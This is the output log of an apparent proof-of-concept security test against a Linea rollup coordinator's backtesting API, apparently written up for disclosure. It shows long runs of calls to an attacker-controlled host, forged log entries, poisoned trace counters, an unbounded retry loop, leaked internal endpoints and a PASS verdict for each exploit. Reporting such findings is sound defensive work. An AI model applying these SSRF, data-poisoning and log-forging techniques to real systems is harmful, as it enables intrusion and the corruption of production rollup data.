+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    FABRICATED traces file path + engine version
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL linea_generateConflatedTracesToFileV2    passthrough
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+  CALL rollup_getZkEVMStateMerkleProofV0        *** COORDINATOR ASKED THE ATTACKER FOR THE STATE MERKLE PROOF ***
+>> if rollup_getZkEVMStateMerkleProofV0 appears above, the coordinator
+   requested the L2 state Merkle proof from the ATTACKER: the attacker
+   never needed to know the real Shomei - shomeiApi is attacker input.
+
+--- [A7] Log forging (CWE-117) --------------------------------------
+submit response: {"jsonrpc":"2.0","id":8,"error":{"code":-32603,"message":"Internal error"}}
+  time=2099-01-01T00:00:00,000Z level=ERROR message=SPOOF1788708478 FAKE-LOG-ENTRY-BY-ATTACKER | logger=JsonRpcMessageProcessor thread=vert.x-eventloop-thread-5 | java.lang.IllegalArgumentException: Ill
+  time=2099-01-01T00:00:00,000Z level=ERROR message=SPOOF1788708478 FAKE-LOG-ENTRY-BY-ATTACKER
+
+--- [A8] Persistent SSRF / resource exhaustion ----------------------
+  blackhole job 1: 717-718--1549209555
+  blackhole job 2: 
+  blackhole job 3: 
+  blackhole job 4: 
+  blackhole job 5: 
+waiting 60s for retry accumulation...
+
+=== [3] AFTER ATTACK - evidence (defender view) =====================
+poisoned batches (ADD=1000 / 999999999):
+  batch=[717..717]1 trigger=TRACES_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=1000
+  batch=[718..718]1 trigger=TARGET_BLOCK_NUMBER tracesCounters=TracesCountersV5(countersMap={ADD=1000
+  batch=[717..717]1 trigger=TRACES_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=999999999
+  batch=[718..718]1 trigger=TARGET_BLOCK_NUMBER tracesCounters=TracesCountersV5(countersMap={ADD=999999999
+
+retry-loop evidence (unbounded, survives restart):
+  time=2026-09-06T16:54:17,947Z level=WARN message=Request '{"jsonrpc":"2.0","id":1,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":717}]}' already retried 75 times. lastError=io.netty.channel.AbstractCh
+  time=2026-09-06T16:54:18,499Z level=WARN message=Request '{"jsonrpc":"2.0","id":12,"method":"linea_generateConflatedTracesToFileV2","params":[{"startBlockNumber":572,"endBlockNumber":573}]}' already retried 1488 times. l
+
+topology disclosure via config dump (sample):
+  endpoints=[http://10.10.10.1:12345/fab]
+  endpoints=[http://10.10.10.1:12345/recon]
+  endpoints=[http://10.10.10.1:12345/tap]
+  endpoints=[http://10.10.10.1:12345/tapover]
+  endpoints=[http://10.10.10.1:12345]
+  endpoints=[http://10.10.10.1:12346/poison-file]
+  endpoints=[http://10.10.10.1:12346/poison-over]
+  endpoints=[http://10.10.10.1:12346/poison-plus]
+
+=== IMPACT TABLE (before -> after) ==================================
+  metric                                 BEFORE      AFTER
+  poisoned batch lines               20(natural)          4
+  retry-loop log lines                     5559       6030
+  forged log lines (CWE-117)                  3          6
+  config-dump lines (info leak)              20         31
+  backtesting job dirs                       20         27
+  calls to attacker server                    0       1135
+
+=== [4] FINAL IMPACT VERDICT ========================================
+[PASS] SSRF: coordinator performed server-side POSTs to attacker URL
+[PASS] DATA POISONING: attacker counters ingested -> conflation decisions changed (ADD=1000 / 999999999, trigger=TRACES_LIMIT)
+[PASS] PROVER-INPUT CONTROL: coordinator requested the state Merkle proof FROM THE ATTACKER (rollup_* at OOB)
+[PASS] LOG FORGING (CWE-117): forged log entry with attacker timestamp/level/message
+[PASS] PERSISTENT SSRF/DoS: unbounded retry loop grew 5559 -> 6030 lines; jobs remain IN_PROGRESS indefinitely
+[PASS] INFO DISCLOSURE: attacker-triggered config dumps leak internal topology (endpoints, signer keys paths, DB creds shape)
+
+Documented boundaries (source-verified): no L1 submission capability in
+backtesting jobs (no signer / no submission components / in-memory-only
+persistence); no write primitive (request filenames built from block
+numbers and internal hashes only); no RCE vector found (POST-only HTTP
+client, redirects not followed, no response reflection).
+
+Artifacts: poc_final_results.txt | /tmp/poc_final_oob.log
+=== CLEANUP (run manually to preserve evidence first) ===============
+  docker restart coordinator
+  rm -rf /workspaces/lineth-monorepo/tmp/local/conflation-backtesting/*
+######################################################################
+# PoC finished: 2026-09-06T16:54:24Z
+######################################################################
